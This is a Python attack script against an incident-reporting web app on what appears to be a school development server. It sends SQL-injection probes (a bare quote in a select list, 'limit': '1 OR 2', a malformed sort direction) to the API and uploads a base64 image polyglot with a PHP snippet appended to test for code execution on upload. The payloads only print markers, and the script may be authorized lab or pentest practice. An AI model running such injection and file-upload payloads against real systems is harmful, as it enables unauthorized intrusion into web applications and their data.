import requests as r
import base64
url = "http://wa3lm.dev.spsejecna.net/incident/select.php"
url2 = "http://wa3lm.dev.spsejecna.net/incident/api.php"



def create_polyglot_base64(image_path, payload=b"<?php echo 'pwned'; ?>"):
    with open(image_path, "rb") as f:
        img = f.read()

    # append payload
    polyglot = img + payload

    # encode
    encoded = base64.b64encode(polyglot).decode("utf-8")

    # detect type from extension
    if image_path.endswith(".png"):
        mime = "image/png"
    elif image_path.endswith(".jpg") or image_path.endswith(".jpeg"):
        mime = "image/jpeg"
    elif image_path.endswith(".webp"):
        mime = "image/webp"
    else:
        raise ValueError("Unsupported image type")

    return f"data:{mime};base64,{encoded}"

#res = r.post(url, json=payload)
# print(res.status_code)
# print(res.json())




def getdata():
    url2 = "http://wa3lm.dev.spsejecna.net/incident/api.php"

    payload2 = {
    "select": ["'"],
    "where": {},
    "orderBy": {"column": "created_at", "direction": "ASCC"},
    "limit": "1 OR 2",
    "offset": 0,
}
    res2 = r.post(url, json=payload2)
    print(res2.status_code)
    try:
        response = res2.json()
    except Exception as e:
        print(e)    
    print()
    print()
    print()
    print()
    
    print(repr(res2.text))
    print()
    print()
    print()
    print()
    for row in response["data"]:
        print(row)
    print()    
    print()    
    print()    
    print()    
def getalldata():
    url2 = "http://wa3lm.dev.spsejecna.net/incident/api.php"

    payload2 = {
    "select": ["created_at","reporter_name"],
    "where": {},
    "orderBy": {"column": "created_at", "direction": "DESC"},
    "limit": 20,
    "offset": 0,
}
    res2 = r.post(url, json=payload2)
    print(res2.status_code)
    try:
        response = res2.json()
    except Exception as e:
        print(e)    
    print()
    print()
    print()
    print()
    for row in response["data"]:
        print(row)
    print()    
    print()    
    print()    
    print()    
    
        
    
def insertData():


    encoded=None
    with open("image.jpg", "rb") as f:
        encoded = base64.b64encode(f.read()).decode("utf-8")
        encoded2=base64.b64encode(b"echo 'hello'").decode("utf-8")
        payload = b"\x89PNG\r\n\x1a\n" + b"echo 'hello'"
    encoded3 = base64.b64encode(payload).decode()
    encoded4 = create_polyglot_base64("image.jpg")
    pld = {
        "reporterName": "lukas masopust",
        "reporterEmail": "jan.novak@example.com",
        "category": "Požár",
        "location": "Sklad č. 4",
        "description": "Na místě je cítit kouř a viditelné jiskry.",
        "gps": "50.087, 14.421",
        "imageBase64": encoded4
    }

    res = r.post(url2, json=pld)

    print("Status:", res.status_code)

    try:
        data = res.json()
        print("JSON:", data)
    except Exception as ex:
        print("JSON parse error:", ex)
        print("Raw response:", repr(res.text))




if __name__ == "__main__":
    getalldata()